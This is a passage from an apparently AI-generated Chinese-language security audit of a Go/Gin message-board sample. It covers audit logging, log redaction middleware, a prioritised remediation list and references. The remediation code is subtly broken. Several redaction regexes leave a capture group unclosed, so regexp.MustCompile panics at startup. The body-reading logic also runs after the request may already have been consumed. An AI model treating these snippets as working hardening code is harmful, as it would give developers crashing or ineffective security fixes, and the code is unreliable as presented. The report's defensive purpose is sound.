        zap.String("user_ip", event.UserIP),
        zap.String("action", event.Action),
        zap.String("resource", event.Resource),
        zap.String("details", event.Details),
        zap.Bool("success", event.Success),
    )
}

// 使用示例
func (c *adminAuthControllerImpl) Handle(ctx *gin.Context) {
    // ... 登录逻辑 ...

    if err != nil {
        auditService.Log(&AuditEvent{
            UserIP:   ctx.ClientIP(),
            Action:   "login",
            Resource: "admin",
            Details:  "password incorrect",
            Success:  false,
        })
        return
    }

    auditService.Log(&AuditEvent{
        UserID:   "admin",
        UserIP:   ctx.ClientIP(),
        Action:   "login",
        Resource: "admin",
        Details:  "successful login",
        Success:  true,
    })
}
```

---

### 🔵 建议：添加请求日志脱敏

**文件位置**: `samples/messageboard/internal/middlewares/request_logger_middleware.go`

**问题**: 请求日志可能包含敏感信息（密码、token等）

**修复建议**:
对日志中的敏感字段进行脱敏

**安全加固代码示例**:

```go
// samples/messageboard/internal/middlewares/request_logger_middleware.go
import (
    "bytes"
    "io"
    "net/url"
    "regexp"
)

var sensitivePatterns = []*regexp.Regexp{
    regexp.MustCompile(`("password"\s*:\s*")[^"]+("`),
    regexp.MustCompile(`("token"\s*:\s*")[^"]+("`),
    regexp.MustCompile(`("secret"\s*:\s*")[^"]+("`),
    regexp.MustCompile(`(Bearer\s+)[^\s]+`),
}

func sanitizeRequestBody(body []byte) []byte {
    bodyStr := string(body)
    for _, pattern := range sensitivePatterns {
        bodyStr = pattern.ReplaceAllString(bodyStr, "${1}***")
    }
    return []byte(bodyStr)
}

func sanitizeQueryString(query string) string {
    parsed, _ := url.ParseQuery(query)
    sensitiveKeys := []string{"password", "token", "secret", "api_key"}

    for _, key := range sensitiveKeys {
        if parsed.Has(key) {
            parsed.Set(key, "***")
        }
    }

    return parsed.Encode()
}

func (m *requestLoggerMiddleware) logRequest(c *gin.Context, duration time.Duration) {
    // 获取请求体
    var bodyBytes []byte
    if c.Request.Body != nil {
        bodyBytes, _ = io.ReadAll(c.Request.Body)
        c.Request.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
    }

    // 脱敏
    sanitizedBody := sanitizeRequestBody(bodyBytes)
    sanitizedQuery := sanitizeQueryString(c.Request.URL.RawQuery)

    // 记录日志
    m.Logger.Info("HTTP Request",
        zap.String("method", c.Request.Method),
        zap.String("path", c.Request.URL.Path),
        zap.String("query", sanitizedQuery),
        zap.String("body", string(sanitizedBody)),
        zap.Int("status", c.Writer.Status()),
        zap.Duration("duration", duration),
        zap.String("client_ip", c.ClientIP()),
    )
}
```

---

## 8. 安全加固总结

### 优先修复（P0）:

1. ✅ 立即移除配置文件中的硬编码密码
2. ✅ 使用bcrypt进行密码哈希存储
3. ✅ 添加密码复杂度验证
4. ✅ 实施会话速率限制

### 短期修复（P1）:

1. ✅ XSS防护和HTML转义
2. ✅ 错误信息过滤和通用错误消息
3. ✅ 强制登出机制
4. ✅ 审计日志

### 长期改进（P2）:

1. ✅ Content Security Policy (CSP)
2. ✅ 依赖安全扫描集成
3. ✅ 请求日志脱敏
4. ✅ 安全配置验证

---

## 9. 参考资源

### Go安全最佳实践:
- [OWASP Go Project](https://owasp.org/www-project-go-secure-coding-practices/)
- [Go Security Guidelines](https://github.com/golang/go/wiki/Security)
- [Gin Security Best Practices](https://gin-gonic.com/docs/examples/)

### 工具:
- [govulncheck](https://golang.org/x/vuln/cmd/govulncheck)
- [Trivy](https://github.com/aquasecurity/trivy)
- [Snyk](https://snyk.io/)

### 密码存储:
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [bcrypt RFC](https://github.com/golang/crypto/blob/master/bcrypt/bcrypt.go)

---

**审查人**: AI Security Auditor
**报告版本**: 1.0
**下次审查**: 2026-02-19
